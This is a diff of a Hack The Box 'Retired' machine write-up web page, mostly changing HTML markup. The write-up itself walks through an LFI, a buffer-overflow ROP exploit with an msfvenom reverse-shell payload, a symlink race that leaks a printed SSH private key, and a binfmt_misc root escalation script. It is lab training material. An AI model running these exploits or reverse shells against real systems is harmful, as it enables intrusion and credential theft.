+<pre translate="no" class="language-c"><code v-pre class="language-c">void activate_license(int sockfd)
 
 {
   int iVar1;
@@ -573,15 +573,15 @@ The logic in the <code v-pre>activate_license</code> code seems to be:</p>
 <p>If we could manipulate the file size to something bigger then 512(buffer size) we could potentially overwrite some addresses. Here we have a buffer overflow.</p>
 <p>Continuing in the code logic, we see that it is writing the file contents to a database file.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">iVar1 = sqlite3_open(&quot;license.sqlite&quot;,&amp;db);</code></pre>
+<pre translate="no" class="language-c"><code v-pre class="language-c">iVar1 = sqlite3_open(&quot;license.sqlite&quot;,&amp;db);</code></pre>
 </doc-codeblock></div>
 <p>Using the LFI we can find the database file <code v-pre>license.sqlite</code>. Lets download to analyse it:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ curl 10.129.196.121/index.php?page=../license.sqlite -o license.sqlite</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ curl 10.129.196.121/index.php?page=../license.sqlite -o license.sqlite</code></pre>
 </doc-codeblock></div>
 <p>Looking at the db file locally using <code v-pre>sqlitebrowser</code> we see one entry of 512 A&#x27;s:
 <figure class="content-center">
-    <img src="images/image2.png" alt="">
+    <img src="images/image2.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 It is writing 512 bytes to the database file, probably if we send 512+ bytes, the extra length will start to overwrite the memory address.</p>
@@ -605,7 +605,7 @@ It is writing 512 bytes to the database file, probably if we send 512+ bytes, th
 <p>To find the RIP (rewrite point) we will create a cyclic pattern to identify how many characters we need to cause the buffer overflow.
 Lets run the binary using gdb and start creating an exploit skeleton:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ gdb activate_license
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ gdb activate_license
 pwndbg&gt; r 1337                                                            
 Starting program: /home/caue/htb/retired/activate/activate_license 1337   
 [Thread debugging using libthread_db enabled]                             
@@ -615,7 +615,7 @@ Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&qu
 </doc-codeblock></div>
 <p>Exploit skeleton:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-python"><code v-pre class="language-python">from pwn import *
+<pre translate="no" class="language-python"><code v-pre class="language-python">from pwn import *
 
 io = remote('127.0.0.1', 1337)
 filesize = p32(800, endian='big')   # We need to pack as 32 bit big endian
@@ -630,23 +630,23 @@ io.send(payload)</code></pre>
 </doc-codeblock></div>
 <p>Running the exploit script we get a segmentation fault in the binary:
 <figure class="content-center">
-    <img src="images/image3.png" alt="">
+    <img src="images/image3.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>Now we look at what value has settled in the RSP register, and calculate the offset to RIP.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">pwndbg&gt; x/xw $rsp
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">pwndbg&gt; x/xw $rsp
 0x7fffffffdd18: 0x66616166</code></pre>
 </doc-codeblock></div>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ python2 -c 'from pwn import *; print cyclic_find(unhex(&quot;66616166&quot;)[::-1])'
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ python2 -c 'from pwn import *; print cyclic_find(unhex(&quot;66616166&quot;)[::-1])'
 520</code></pre>
 </doc-codeblock></div>
 <p>So we can send 520 bytes before overwriting the RIP.
 After exiting the debugger, it would be nice to forcibly kill all web server instances:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ ps aux | grep activate_license | awk '{print $2}' | xargs kill -9</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ ps aux | grep activate_license | awk '{print $2}' | xargs kill -9</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="overwritting-the-rip">
     <h3>
@@ -656,7 +656,7 @@ After exiting the debugger, it would be nice to forcibly kill all web server ins
 </doc-anchor-target>
 <p>Let&#x27;s check that we can actually overwrite the return address with an arbitrary value. To do this, we will write a simple Python script that will send 520 A&#x27;s + <code v-pre>0xd34dc0d3</code> and check the RIP address:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-python"><code v-pre class="language-python">#!/usr/bin/env python3
+<pre translate="no" class="language-python"><code v-pre class="language-python">#!/usr/bin/env python3
 
 from pwn import *
 
@@ -678,7 +678,7 @@ r.sendline()</code></pre>
 </doc-codeblock></div>
 <p>Once again, start the binary with gdb and run the python exploit:
 <figure class="content-center">
-    <img src="retired/images/image4.png" alt="">
+    <img src="retired/images/image4.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 Perfect!</p>
@@ -690,7 +690,7 @@ Perfect!</p>
 </doc-anchor-target>
 <p>Before we continue lets check the binary protections:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ checksec --file activate_license
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ checksec --file activate_license
 [*] '/home/caue/htb/retired/activate/activate_license'
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -710,19 +710,19 @@ However, there is a technique that calls <code v-pre>mprotect</code> from the li
 Basically we can use mprotect to set the stack executable again. For that, we will need some memory addresses to build a ROP chain.</p>
 <p>We can use GDB to load the binary and take a look at the memory addresses used. But first, I will turn ASLR off so it makes easier to build our exploit:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></pre>
 </doc-codeblock></div>
 <p>Load the binary into GDB:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ gdb activate_license</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ gdb activate_license</code></pre>
 </doc-codeblock></div>
 <p>Run the binary to listen on port 1337:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">pwndbg&gt; r 1337</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">pwndbg&gt; r 1337</code></pre>
 </doc-codeblock></div>
 <p>Now we can simply press CTRL + C to pause the execution and have a look at the addresses used with <code v-pre>vmmap</code>:
 <figure class="content-center">
-    <img src="images/image10.png" alt="">
+    <img src="images/image10.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -749,13 +749,13 @@ Basically we can use mprotect to set the stack executable again. For that, we wi
 </ul>
 <p>Make a copy of the libc used by the binary and use <code v-pre>ropper</code> to find the gadgets needed:
 <figure class="content-center">
-    <img src="images/image11.png" alt="">
+    <img src="images/image11.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>With all the addresses above we just need a shellcode to be executed after the <code v-pre>jmp rsp</code> call. We can use <code v-pre>msfvenom</code> to create a reverse shell</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ msfvenom -p linux/x64/shell_reverse_tcp RHOST=127.0.0.1 LPORT=1234 -f py -b '\x00'
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ msfvenom -p linux/x64/shell_reverse_tcp RHOST=127.0.0.1 LPORT=1234 -f py -b '\x00'
 
 Payload size: 119 bytes
 Final size of py file: 597 bytes
@@ -780,7 +780,7 @@ shellcode += b&quot;\x72\xeb&quot;</code></pre>
 </doc-anchor-target>
 <p>Putting all together:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-python"><code v-pre class="language-python">#!/usr/bin/env python3
+<pre translate="no" class="language-python"><code v-pre class="language-python">#!/usr/bin/env python3
 
 from pwn import *
 
@@ -850,14 +850,14 @@ r.sendline(payload)</code></pre>
 <li>Terminal 2: Running the python exploit</li>
 <li>Terminal 3: Netcat listener on port 1234
 <figure class="content-center">
-    <img src="images/image12.png" alt="">
+    <img src="images/image12.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </li>
 </ul>
 <p>After running the python script we get our reverse shell back:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">caue@kali:~/htb/retired/activate$ nc -lnvp 1234
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">caue@kali:~/htb/retired/activate$ nc -lnvp 1234
 listening on [any] 1234 ...
 connect to [192.168.1.104] from (UNKNOWN) [192.168.1.104] 41374
 
@@ -881,7 +881,7 @@ uid=1000(caue) gid=1000(caue) groups=1000(caue),4(adm),20(dialout),24(cdrom),25(
 <p>The first thing we need to do is using the LFI to download the libraries used with the binary so we can extract the addresses needed for the ROP chain.
 Looking at the <code v-pre>http://10.10.11.154/index.php?page=/proc/424/maps</code> we can see the libraries loaded:
 <figure class="content-center">
-    <img src="images/image9.png" alt="">
+    <img src="images/image9.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -889,17 +889,17 @@ Looking at the <code v-pre>http://10.10.11.154/index.php?page=/proc/424/maps</co
 We will use <code v-pre>libc-2.31.so</code> to extract most of the addresses for the ROP chain, however we will need a <code v-pre>jmp rsp</code> address that it does not exist in this library. Thats when <code v-pre>libsqlite3.so.0.8.6</code> comes in handy. Also the stack start, stack end will be used.</p>
 <p>We can easily download the libraries using curl:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ curl http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so -o libc-2.31.so
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ curl http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so -o libc-2.31.so
 $ curl http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 -o libsqlite3.so.0.8.6</code></pre>
 </doc-codeblock></div>
 <p>Instead of typing all the ROP addresses manually, we will use the <code v-pre>ROP</code> function from pwntools. So we can simply load a library like that:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">libc = ELF('./libc.so.6', checksec=False)
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">libc = ELF('./libc.so.6', checksec=False)
 rop = ROP([libc])</code></pre>
 </doc-codeblock></div>
 <p>And simply search for gadgets like that:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">pop_rdi = rop.rdi[0]                        
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">pop_rdi = rop.rdi[0]                        
 pop_rsi = rop.rsi[0]                        
 pop_rdx = rop.rdx[0]                        
 jmp_rsp = rop.jmp_rsp[0]                    </code></pre>
@@ -912,7 +912,7 @@ jmp_rsp = rop.jmp_rsp[0]                    </code></pre>
 </doc-anchor-target>
 <p>Using the information we got from the LFI and using the libraries we just downloaded we can get to a final exploit like below:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-python"><code v-pre class="language-python">#!/usr/bin/env python3
+<pre translate="no" class="language-python"><code v-pre class="language-python">#!/usr/bin/env python3
 
 import requests
 from pwn import *
@@ -994,7 +994,7 @@ else:
 </doc-anchor-target>
 <p>After the binary exploitation successfully done we get a sheel as <code v-pre>www-data</code>.
 <figure class="content-center">
-    <img src="images/image13.png" alt="">
+    <img src="images/image13.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -1006,7 +1006,7 @@ else:
 </doc-anchor-target>
 <p>Enumerating the system we find an interesting bash script <code v-pre>/usr/bin/webbackup</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">#!/bin/bash
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">#!/bin/bash
 set -euf -o pipefail
 cd /var/www/
 SRC=/var/www/html
@@ -1025,7 +1025,7 @@ KEEP=10
 </doc-codeblock></div>
 <p>If we look at <code v-pre>/var/www</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">www-data@retired:/var/www$ ls -la
+<pre translate="no" class="language-none"><code v-pre class="language-none">www-data@retired:/var/www$ ls -la
 total 2008
 drwxrwsrwx  3 www-data www-data   4096 Apr 29 04:20 .
 drwxr-xr-x 12 root     root       4096 Mar 11 14:36 ..
@@ -1039,7 +1039,7 @@ drwxrwsrwx  5 www-data www-data   4096 Mar 11 14:36 html
 <p>It seems that the user <code v-pre>dev</code> is making use of this script at every minute to make a backup of the web files.</p>
 <p>Create symlink to user <code v-pre>dev</code> SSH private key:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">www-data@retired:/var/www/html$ ln -s /home/dev/.ssh/id_rsa dev_key
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">www-data@retired:/var/www/html$ ln -s /home/dev/.ssh/id_rsa dev_key
 www-data@retired:/var/www/html$ ls -la
 total 48
 drwxrwsrwx 5 www-data www-data  4096 Apr 29 04:29 .
@@ -1055,7 +1055,7 @@ drwxrwsrwx 2 www-data www-data  4096 Mar 11 14:36 js</code></pre>
 </doc-codeblock></div>
 <p>It is a racing condition as the <code v-pre>webbackup</code> script will do a cleanup before zipping the files. We need to constantly being creating this symbolic link when the time comes.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">www-data@retired:/var/www/html$ ln -s /home/dev/.ssh/id_rsa dev_key                                                                                      
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">www-data@retired:/var/www/html$ ln -s /home/dev/.ssh/id_rsa dev_key                                                                                      
 ln: failed to create symbolic link 'dev_key': File exists                                                                                                
 www-data@retired:/var/www/html$ ln -s /home/dev/.ssh/id_rsa dev_key                                                                                      
 ln: failed to create symbolic link 'dev_key': File exists
@@ -1064,7 +1064,7 @@ ln: failed to create symbolic link 'dev_key': File exists
 </doc-codeblock></div>
 <p>Until finally the script is triggered and we can unzip the backup file containing the user ssh key:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">www-data@retired:/var/www$ mkdir test
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">www-data@retired:/var/www$ mkdir test
 www-data@retired:/var/www$ cp 2022-04-29_04-33-06-html.zip test/
 www-data@retired:/var/www$ cd test/
 www-data@retired:/var/www/test$ unzip 2022-04-29_04-33-06-html.zip
@@ -1102,7 +1102,7 @@ Archive:  2022-04-29_04-33-06-html.zip
 </doc-codeblock></div>
 <p>Reading the private key:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">www-data@retired:/var/www/test/var/www/html$ cat dev_key 
+<pre translate="no" class="language-none"><code v-pre class="language-none">www-data@retired:/var/www/test/var/www/html$ cat dev_key 
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAYEA58qqrW05/urHKCqCgcIPhGka60Y+nQcngHS6IvG44gcb3w0HN/yf
@@ -1120,7 +1120,7 @@ aQSXt9vNnIW2hDwX9fIFGKaz58FYweCXzLwgRVGBfnpq2QSXB0iXtLCNkWbAS9DM3esjsA
 </doc-codeblock></div>
 <p>We can use this key to SSH in as <code v-pre>dev</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">caue@kali:~/htb/retired$ ssh -i dev.idrsa dev@10.10.11.154          
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">caue@kali:~/htb/retired$ ssh -i dev.idrsa dev@10.10.11.154          
 The authenticity of host 10.10.11.154 (10.10.11.154) cant be established.
 ED25519 key fingerprint is SHA256:yJ9p3p5aZFrQR+J2qeIQ54gY9gQ7kcEbymYQBvP5PdY.
 This key is not known by any other names
@@ -1145,7 +1145,7 @@ dev@retired:~$</code></pre>
 </doc-anchor-target>
 <p>As we SSH in as <code v-pre>dev</code> we see some interesting files and fodlers in the home directory:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">dev@retired:~$ ls -la
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">dev@retired:~$ ls -la
 total 40
 drwx------ 6 dev  dev  4096 Mar 11 14:36 .
 drwxr-xr-x 3 root root 4096 Mar 11 14:36 ..
@@ -1161,7 +1161,7 @@ drwx------ 3 dev  dev  4096 Mar 11 14:36 emuemu
 </doc-codeblock></div>
 <p>The emuemu directory:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">dev@retired:~/emuemu$ ls -la
+<pre translate="no" class="language-none"><code v-pre class="language-none">dev@retired:~/emuemu$ ls -la
 total 68
 drwx------ 3 dev dev  4096 Mar 11 14:36 .
 drwx------ 6 dev dev  4096 Mar 11 14:36 ..
@@ -1175,7 +1175,7 @@ drwx------ 2 dev dev  4096 Mar 11 14:36 test</code></pre>
 </doc-codeblock></div>
 <p>The <code v-pre>emuemu</code> binary is also found at <code v-pre>/usr/lib/emuemu/</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">dev@retired:~$ ls -la /usr/lib/emuemu/
+<pre translate="no" class="language-none"><code v-pre class="language-none">dev@retired:~$ ls -la /usr/lib/emuemu/
 total 28
 drwxr-xr-x  2 root root  4096 Mar 11 14:36 .
 drwxr-xr-x 54 root root  4096 Mar 28 11:12 ..
@@ -1184,7 +1184,7 @@ drwxr-xr-x 54 root root  4096 Mar 28 11:12 ..
 <p>We can read the source-code, not very interesting though:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <div class="codeblock-title">emuemu.c</div>
-<pre class="language-c"><code v-pre class="language-c">#include &lt;stdio.h&gt;
+<pre translate="no" class="language-c"><code v-pre class="language-c">#include &lt;stdio.h&gt;
 
 /* currently this is only a dummy implementation doing nothing */
 
@@ -1196,7 +1196,7 @@ int main(void) {
 <p>We also see a <code v-pre>reg_helper</code> binary there and we can have a look at the source-code. The interesting part here is that this file is owned by <code v-pre>root</code>!  <code v-pre>/home/dev/emuemu/reg_helper.c</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <div class="codeblock-title">reg_helper.c</div>
-<pre class="language-c"><code v-pre class="language-c">#define _GNU_SOURCE
+<pre translate="no" class="language-c"><code v-pre class="language-c">#define _GNU_SOURCE
 
 #include &lt;fcntl.h&gt;
 #include &lt;stdio.h&gt;
@@ -1225,7 +1225,7 @@ int main(void) {
 <p>Based on Wikipedia, <strong>binfmt_misc</strong> (<em>Miscellaneous Binary Format</em>) is a capability of the <a href="https://en.wikipedia.org/wiki/Linux_kernel" title="Linux kernel">Linux kernel</a> which allows arbitrary <a href="https://en.wikipedia.org/wiki/Executable_file_format" title="Executable file format">executable file formats</a> to be recognized and passed to certain <a href="https://en.wikipedia.org/wiki/User_space" title="User space">user space</a> applications, such as <a href="https://en.wikipedia.org/wiki/Emulator" title="Emulator">emulators</a> and <a href="https://en.wikipedia.org/wiki/Virtual_machine" title="Virtual machine">virtual machines</a>.It is one of a number of binary format handlers in the kernel that are involved in preparing a user-space program to run.</p>
 <p>We can check how EMUEMU is used:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">dev@retired:~$ cat /proc/sys/fs/binfmt_misc/EMUEMU 
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">dev@retired:~$ cat /proc/sys/fs/binfmt_misc/EMUEMU 
 enabled
 interpreter /usr/bin/emuemu
 flags: 
@@ -1243,7 +1243,7 @@ magic 13374f53545249434800524f4d00</code></pre>
 We can make a copy of that and do some modifications to make it work for us.
 Modify the last line:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># Original
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># Original
 echo &quot;$binfmt_line&quot; &gt; &quot;$mountpoint&quot;/register
 
 # Modified
@@ -1251,7 +1251,7 @@ echo &quot;$binfmt_line&quot; | /usr/lib/emuemu/reg_helper</code></pre>
 </doc-codeblock></div>
 <p>Final exploit:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">#!/bin/bash
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">#!/bin/bash
 
 readonly searchsuid=&quot;/bin/&quot;
 readonly mountpoint=&quot;/proc/sys/fs/binfmt_misc&quot;
@@ -1350,7 +1350,7 @@ exec &quot;$target&quot;</code></pre>
 </doc-codeblock></div>
 <p>And we are root!</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none"># id
+<pre translate="no" class="language-none"><code v-pre class="language-none"># id
 uid=0(root) gid=1001(dev) groups=1001(dev),33(www-data)
 # ls -la /root
 total 28
@@ -1368,23 +1368,23 @@ drwxr-xr-x  3 root root 4096 Mar 11 14:36 .local
                                 <!-- Required only on API pages -->
                                 <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                             </div>
-                            <footer class="clear-both">
+                            <footer id="retype-content-footer" class="clear-both">
                             
-                                <nav class="flex mt-14">
+                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/phoenix/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/phoenix/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
-                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
                                                 <span class="block mt-1">Phoenix</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/routerspace/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/routerspace/">
                                             <span>
-                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
                                                 <span class="block mt-1">Routerspace</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
@@ -1394,24 +1394,24 @@ drwxr-xr-x  3 root root 4096 Mar 11 14:36 .local
                             </footer>
                         </main>
                 
-                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
-                            <footer class="flex flex-wrap items-center justify-between">
-                                <div>
+                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
+                                <div id="retype-footer-links" class="print:hidden">
                                     <ul class="flex flex-wrap items-center text-sm">
                                     </ul>
                                 </div>
-                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. Caue All rights reserved.</p></div>
+                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. Caue All rights reserved.</p></div>
                             </footer>
                         </div>
                     </div>
                 
                     <!-- Rendered if sidebar right is enabled -->
                     <!-- Sidebar right skeleton-->
-                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
                         <div class="pl-5">
-                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                         </div>
                     </div>
                 
@@ -1427,7 +1427,7 @@ drwxr-xr-x  3 root root 4096 Mar 11 14:36 .local
     </div>
 
 
-    <div id="docs-overlay-target"></div>
+    <div id="retype-overlay-target"></div>
 
     <script data-cfasync="false">window.__DOCS__ = { "title": "Retired", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
